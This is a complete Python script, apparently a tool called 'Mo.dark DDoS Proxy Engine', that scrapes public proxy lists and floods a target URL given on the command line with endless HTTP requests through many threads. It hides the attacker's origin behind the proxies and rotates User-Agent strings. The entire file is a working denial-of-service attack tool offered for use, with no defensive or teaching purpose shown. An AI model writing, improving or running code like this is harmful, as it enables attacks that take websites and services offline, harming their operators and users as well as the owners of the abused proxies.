#!/usr/bin/env python3
import sys, os, re, socket, time, threading, signal, random
import requests
from urllib.parse import urlparse

R, G, Y, C, P, N = (
    '\033[0;31m', '\033[0;32m', '\033[1;33m',
    '\033[0;36m', '\033[0;35m', '\033[0m'
)

BANNER = f"""{R}
    ██████╗ ██████╗  ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
    ██║  ██║██████╔╝██║   ██║███████╗    ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ 
    ██║  ██║██╔══██╗██║   ██║╚════██║    ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  
    ██████╔╝██║  ██║╚██████╔╝███████║    ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
{N}
{C}=====[ Mo.dark DDoS Proxy Engine v7.0 - UESM ]====={N}
{Y}U N R E S T R I C T E D   M O D E{N}\n"""

running = True

def fetch_proxies_from_github():
    proxies = []
    urls = [
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
    ]
    for url in urls:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
        except:
            pass
    return proxies

def fetch_proxies_from_api():
    proxies = []
    apis = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
    ]
    for api in apis:
        try:
            r = requests.get(api, timeout=10)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and re.match(r'\d+\.\d+\.\d+\.\d+:\d+', line):
                        proxies.append(line)
        except:
            pass
    return proxies

def load_proxies():
    print(f"{C}[*] Fetching proxies from sources...{N}")
    proxies = fetch_proxies_from_github() + fetch_proxies_from_api()
    proxies = list(set(proxies))
    print(f"{G}[✓] Fetched {len(proxies)} unique proxies{N}")
    return proxies

def validate_proxy(proxy, test_url="http://httpbin.org/ip"):
    try:
        r = requests.get(test_url, proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, timeout=5)
        return r.status_code == 200
    except:
        return False

def filter_valid_proxies(proxies, max_check=50):
    print(f"{C}[*] Validating proxies (may take a minute)...{N}")
    valid = []
    for p in proxies[:max_check]:
        if validate_proxy(p):
            valid.append(p)
    print(f"{G}[✓] Found {len(valid)} working proxies{N}")
    return valid

def attack_via_proxy(url, proxy, thread_id):
    global running
    headers = {'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(100,999)}.36'}
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    while running:
        try:
            requests.get(url, proxies=proxy_dict, timeout=3, headers=headers, verify=False)
        except:
            pass

def start_attack(url, proxies, threads_per_proxy=5):
    global running
    all_threads = []
    proxy_index = 0
    
    for i in range(len(proxies) * threads_per_proxy):
        proxy = proxies[proxy_index % len(proxies)]
        t = threading.Thread(target=attack_via_proxy, args=(url, proxy, i))
        t.daemon = True
        t.start()
        all_threads.append(t)
        proxy_index += 1
    
    print(f"{R}[!] Attack running with {len(all_threads)} threads across {len(proxies)} proxies{N}")
    return all_threads

def show_help():
    print(f"""{G}Usage:{N} python3 ddos_proxy_engine_en.py <URL> <THREADS_PER_PROXY>

{G}Example:{N}
  python3 ddos_proxy_engine_en.py https://example.com 10

{G}Notes:{N}
  - Proxies are auto-fetched from proxifly + other sources
  - Total threads = proxies_count × threads_per_proxy
  - HTTP/HTTPS attack only via proxies
""")
    sys.exit(1)

def signal_handler(sig, frame):
    global running
    print(f"\n{R}[!] Attack stopped.{N}")
    running = False
    sys.exit(0)

def main():
    global running
    if len(sys.argv) != 3:
        show_help()
    
    url = sys.argv[1]
    try:
        threads_per_proxy = int(sys.argv[2])
    except:
        show_help()
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    
    proxies = load_proxies()
    if len(proxies) == 0:
        print(f"{R}[X] No proxies found. Check your internet connection.{N}")
        sys.exit(1)
    
    valid_proxies = filter_valid_proxies(proxies, max_check=30)
    if len(valid_proxies) == 0:
        print(f"{Y}[!] No working proxies, using all without validation{N}")
        valid_proxies = proxies[:50]
    
    signal.signal(signal.SIGINT, signal_handler)
    print(f"{R}[!] Attacking {url} via {len(valid_proxies)} proxies... Press Ctrl+C to stop{N}")
    start_attack(url, valid_proxies, threads_per_proxy)
    
    while running:
        time.sleep(1)

if __name__ == "__main__":
    main()